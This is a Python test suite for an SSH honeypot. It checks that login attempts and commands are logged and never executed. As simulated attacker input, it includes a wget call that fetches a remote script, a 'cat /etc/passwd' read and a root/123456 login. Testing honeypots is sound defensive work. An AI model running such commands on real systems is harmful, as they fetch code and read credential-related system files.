import asyncio
import json

import asyncssh
import pytest

from honeypots.common import config, emitter
from honeypots.ssh_hp import server as ssh_server


@pytest.fixture
def log(tmp_path, monkeypatch):
    path = tmp_path / "events.jsonl"
    monkeypatch.setattr(emitter, "LOG_PATH", path)
    ssh_server.AUTH_COUNTS.clear()
    return path


def read_events(path):
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines()]


async def with_server(tmp_path, scenario):
    srv = await ssh_server.start_server("127.0.0.1", 0, tmp_path / "hostkey")
    try:
        await scenario(srv.get_port())
    finally:
        srv.close()
        await srv.wait_closed()
        await asyncio.sleep(0.1)  # let connection_lost run


def test_failed_login_is_logged(tmp_path, log, monkeypatch):
    monkeypatch.setattr(config, "SSH_ACCEPT_AFTER", 3)

    async def scenario(port):
        with pytest.raises(asyncssh.PermissionDenied):
            await asyncssh.connect("127.0.0.1", port, username="root", password="123456",
                                   known_hosts=None, preferred_auth="password")

    asyncio.run(with_server(tmp_path, scenario))
    events = read_events(log)
    auth = [e for e in events if e["event_type"] == "auth_attempt"]
    assert auth and auth[0]["details"]["username"] == "root"
    assert auth[0]["details"]["success"] is False
    assert events[0]["event_type"] == "connect"
    assert events[0]["service"] == "ssh"


def test_exec_command_logged_and_never_executed(tmp_path, log, monkeypatch):
    monkeypatch.setattr(config, "SSH_ACCEPT_AFTER", 1)
    marker = tmp_path / "pwned"
    out = {}

    async def scenario(port):
        async with asyncssh.connect("127.0.0.1", port, username="root", password="x",
                                    known_hosts=None) as conn:
            await conn.run(f"touch {marker}; echo hello > {marker}.2", check=False)
            r2 = await conn.run("whoami; wget http://example.com/a.sh", check=False)
            out["whoami"] = r2.stdout

    asyncio.run(with_server(tmp_path, scenario))
    assert not marker.exists() and not (tmp_path / "pwned.2").exists()  # nothing executed
    assert out["whoami"].startswith("root\n")
    types = [e["event_type"] for e in read_events(log)]
    assert "command" in types and "file_download_attempt" in types and "disconnect" in types


def test_interactive_session(tmp_path, log, monkeypatch):
    monkeypatch.setattr(config, "SSH_ACCEPT_AFTER", 1)
    out = {}

    async def scenario(port):
        async with asyncssh.connect("127.0.0.1", port, username="admin", password="x",
                                    known_hosts=None) as conn:
            proc = await conn.create_process(term_type="xterm")
            proc.stdin.write("id\ncat /etc/passwd\nexit\n")
            out["text"] = await asyncio.wait_for(proc.stdout.read(), 10)

    asyncio.run(with_server(tmp_path, scenario))
    assert "Welcome to Ubuntu" in out["text"]
    assert "uid=1000(admin)" in out["text"]
    cmds = [e["details"]["command"] for e in read_events(log) if e["event_type"] == "command"]
    assert cmds == ["id", "cat /etc/passwd", "exit"]
